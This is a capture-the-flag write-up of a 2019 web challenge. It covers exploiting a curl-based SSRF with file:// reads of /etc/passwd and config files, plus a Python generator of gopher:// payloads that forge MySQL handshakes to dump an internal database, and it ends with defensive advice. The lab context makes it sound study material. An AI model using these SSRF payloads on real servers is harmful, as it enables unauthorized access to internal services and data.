---
title: "Hacklab ESGI 2019 — Rookie Web100 (SSRF via Gopher)"
date: 2019-04-08
description: "SSRF vulnerability in a curl-based web app exploited using the gopher:// protocol to connect to an internal MySQL database and extract the flag."
tags: ["ssrf", "gopher", "curl", "mysql", "web", "ctf"]
platform: "HacklabESGI"
difficulty: "Medium"
category: "Web"
points: 100
author: "Yassine"
draft: false
---

SSRF (Server-Side Request Forgery) via curl's `gopher://` protocol to access an internal MySQL database.

## Challenge Overview

**Category:** Web | **Points:** 100 | **Solves:** 18

![Challenge Description](https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554751591/rookie_description.png)

The challenge presented a "Website Checker" page — any URL submitted gets passed to `curl`. Classic SSRF setup.

![Super Curling Webpage](https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554752661/super_curling.png)

## Information Gathering

First, test the `file://` protocol to read local files:

```
file:///etc/passwd
```

![/etc/passwd via curl](https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554753146/etcpasswd_curl.png)

→ Exposes `/etc/passwd`, revealing `mysql` and `www-data` users.

```
file:///proc/self/environ
```

![proc/self/environ](https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554753425/proc_self_environ.png)

→ Shows `PWD=/var/www/html`.

```
file:///var/www/html/config_test.php
```

![Page source of config_test.php](https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554753689/page_source_config_test.png)

→ The page source reveals a PHP comment:

```php
// TODO: MySQL connection with "tiix" user and adding a MySQL password...
```

**MySQL user `tiix` with no password** — perfect for SSRF via gopher.

## Building the Gopher Payload

The `gopher://` protocol lets curl send raw TCP bytes. We can forge a MySQL client handshake and query.

By sniffing a local MySQL connection with Wireshark:

![Wireshark MySQL connection](https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554754846/wireshark_mysql_conn.png)

Converting packets to raw bytes in Wireshark:

![Wireshark raw bytes](https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554754847/wireshark_mysql_raw_bytes.png)

```python
def gopher_exploit(payload_str):
    payload = [payload_str[i:i+2] for i in range(0, len(payload_str), 2)]
    return 'gopher://127.0.0.1:3306/_%' + '%'.join(payload)
```

### Automated Query Builder

```python
#!/usr/bin/python3

mysql_username = 'tiix'
hex_user = mysql_username.encode().hex()

def gopher_exploit(payload_str):
    payload = [payload_str[i:i+2] for i in range(0, len(payload_str), 2)]
    return 'gopher://127.0.0.1:3306/_%' + '%'.join(payload)

def build_payload(query):
    conn_packet = 'a300000185a6ff0100000001210000000000000000000000000000000000000000000000'
    conn_packet += hex_user
    conn_packet += '00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c'
    conn_packet += '69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d'
    conn_packet += '067838365f36340c70726f6772616d5f6e616d65056d7973716c'

    hex_query = query.strip().encode().hex()
    query_len = '{:02x}'.format(len(hex_query) // 2 + 1)
    query_payload = query_len + '00000003' + hex_query

    return gopher_exploit(conn_packet + query_payload + '0100000001')

# List databases
print(build_payload("show databases"))
```

## Exploitation Steps

**1. List databases:**

Sending the gopher payload for `show databases` reveals the `securityday` database.

![Gopher payload result — MySQL version visible](https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554755781/result_gopher_payload_1.png)

**2. List tables:**
```
use securityday; show tables; → nothinghere, users
```

**3. Dump the flag:**
```sql
use securityday; SELECT * FROM nothinghere;
```

![Flag](https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554756722/flag_rookie.png)

**Flag:** `ESGI{W3lC0me_R00ki3_M0th3r_1s_0ld}`

## Key Takeaways

- **SSRF + gopher = RCE equivalent** against internal services accepting raw TCP
- curl's `gopher://` protocol is a powerful SSRF amplifier — always block it server-side
- Validate and whitelist URLs on the server, never pass user input directly to curl
- Internal MySQL should require authentication and bind to `127.0.0.1` with proper passwords
